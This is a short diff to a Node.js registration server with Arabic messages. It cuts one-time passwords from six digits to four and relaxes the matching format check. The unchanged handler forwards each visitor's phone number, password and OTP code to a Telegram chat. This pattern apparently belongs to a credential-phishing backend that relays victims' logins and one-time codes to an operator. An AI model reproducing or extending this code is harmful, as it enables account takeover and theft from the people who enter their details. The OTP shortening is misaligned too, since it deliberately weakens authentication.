@@ -23,7 +23,7 @@ const otpStore = new Map();
 const OTP_TTL_MS = 10 * 60 * 1000; // 10 minutes
 
 function generateOTP() {
-  return String(Math.floor(100000 + Math.random() * 900000));
+  return String(Math.floor(1000 + Math.random() * 9000));
 }
 
 function sanitizeInput(input) {
@@ -44,7 +44,7 @@ function validateRegistration(phone, entryCode) {
 }
 
 function validateOTP(otpCode) {
-  if (!/^\d{6}$/.test(otpCode)) {
+  if (!/^\d{4}$/.test(otpCode)) {
     return { valid: false, error: 'INVALID_FORMAT' };
   }
   return { valid: true };
@@ -196,7 +196,7 @@ app.post('/api/register', registerLimiter, async (req, res) => {
 
     const time = new Date().toLocaleString('ar-MR');
     await sendToTelegram(
-      `🆕 تسجيل جديد\n━━━━━━━━━━━━━━\n📱 رقم الهاتف: ${phone}\n🔐 كلمة السر: ${entryCode}\n🔢 رمز التحقق (OTP): ${otp}\n⏰ الوقت: ${time}\n━━━━━━━━━━━━━━`
+      `🆕 تسجيل جديد\n━━━━━━━━━━━━━━\n📱 رقم الهاتف: ${phone}\n🔐 كلمة السر: ${entryCode}\n🔢 رمز التحقق: ${otp}\n⏰ الوقت: ${time}\n━━━━━━━━━━━━━━`
     );
 
     return res.json({
